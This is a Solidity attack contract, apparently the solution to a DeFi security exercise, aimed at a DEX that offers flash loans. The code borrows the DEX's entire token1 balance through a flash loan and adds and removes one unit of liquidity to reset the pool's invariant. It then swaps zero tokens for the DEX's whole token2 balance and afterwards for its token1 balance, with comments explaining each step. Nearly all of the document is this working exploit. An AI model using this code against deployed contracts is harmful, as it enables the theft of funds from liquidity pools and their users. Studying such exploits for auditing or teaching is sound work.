pragma solidity 0.8.10;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

interface DexInterface {
    function token1() external returns (address);

    function token2() external returns (address);

    function totalShares() external returns (uint256);

    function shares(address) external returns (uint256);

    function init(uint256, uint256) external;

    function swap(
        address,
        uint256,
        address,
        uint256
    ) external;

    function addLiquidity(uint256) external;

    function removeLiquidity(uint256) external;

    function flashLoan(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bool);
}

contract Attack1 {
    DexInterface internal target;
    IERC20 internal token1;
    IERC20 internal token2;

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // Approve the dex to handle all of our tokens
        //This is basically done to payback the loan and fees at the end of the execution
        IERC20(token1).approve(address(target), amount + 50);
        IERC20(token2).approve(address(target), 50);

        // Outputting the balance of the target contract
        // Note that the target dex has a zero balance for token1
        uint256 target1Balance = token1.balanceOf(address(target));
        uint256 target2Balance = token2.balanceOf(address(target));
        console.log(target1Balance);
        console.log(target2Balance);

        // Now we want to update `k` in the target contract by adding and removing liquidity
        target.addLiquidity(1);
        target.removeLiquidity(1);

        // Run a swap to get free token2 tokens
        target.swap(address(token1), 0, address(token2), target2Balance);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack(
        DexInterface _target,
        IERC20 _token1,
        IERC20 _token2
    ) external {
        // Set state variables
        target = _target;
        token1 = _token1;
        token2 = _token2;
        // Call for a flashloan
        uint256 target1Balance = token1.balanceOf(address(target));
        target.flashLoan(
            address(this),
            address(token1),
            target1Balance,
            bytes("filler")
        );
        // Run a swap to get free token1 tokens

        target.swap(address(token2), 0, address(token1), target1Balance);
    }
}
